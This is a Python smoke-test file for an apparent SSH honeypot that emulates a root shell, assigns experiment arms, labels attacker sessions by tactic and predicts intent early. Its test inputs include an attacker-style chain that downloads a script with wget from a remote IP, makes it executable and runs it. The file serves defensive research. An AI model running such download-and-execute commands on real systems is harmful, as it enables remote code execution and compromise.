"""Smoke tests for the deterministic layer, arms, labeling and features.
Run: python -m pytest tests/ -q   (or: python tests/test_deterministic.py)
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.deception.deterministic import handle
from src.deception.session_state import SessionState
from src.arms import resolve_arm, assign_arm
from ml.labeling import label_session
from ml.online_intent import EarlyIntentPredictor
from ml.features import build_features


def _state():
    return SessionState(hostname="srv-prod-01", emulated_os="Ubuntu 24.04 LTS")


def test_whoami_id_pwd():
    st = _state()
    assert handle("whoami", st) == (True, "root")
    ok, out = handle("id", st)
    assert ok and "uid=0(root)" in out
    assert handle("pwd", st) == (True, "/root")


def test_cd_updates_state():
    st = _state()
    handle("cd /var/www", st)
    assert st.cwd == "/var/www"
    assert handle("pwd", st) == (True, "/var/www")


def test_unknown_command_escalates():
    st = _state()
    handled, _ = handle("./strange_binary --pwn", st)
    assert handled is False   # -> goes to LLM in arms B/C


def test_wget_is_faked_not_fetched():
    st = _state()
    ok, out = handle("wget http://185.2.3.4/x.sh", st)
    assert ok and "saved" in out and "185.2.3.4" in out


def test_arm_assignment_stable_and_valid():
    a1 = assign_arm("203.0.113.9", "salt")
    a2 = assign_arm("203.0.113.9", "salt")
    assert a1 == a2 and a1 in ("A", "B", "C")
    assert resolve_arm("x", "salt", "B") == "B"


def test_labeling_multilabel():
    labs = label_session(["uname -a", "wget http://a/x.sh", "chmod +x x.sh", "./x.sh"])
    assert "Discovery" in labs and "Execution" in labs


def test_online_predictor_first_command():
    p = EarlyIntentPredictor()
    assert p.update("uname -a") == "Discovery"
    assert p.update("wget http://a/x.sh") == "Execution"   # escalates


def test_features_early_vs_full_have_keys():
    sess = {"channel_type": "exec", "username": "root", "commands": [
        {"raw": "uname -a", "normalized": "uname -a", "delta_ms": 0}]}
    fe = build_features(sess, "early")
    ff = build_features(sess, "full")
    assert any(k.startswith("early_") for k in fe)
    assert any(k.startswith("full_") for k in ff)


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print("PASS", fn.__name__)
    print(f"\nAll {len(fns)} tests passed.")
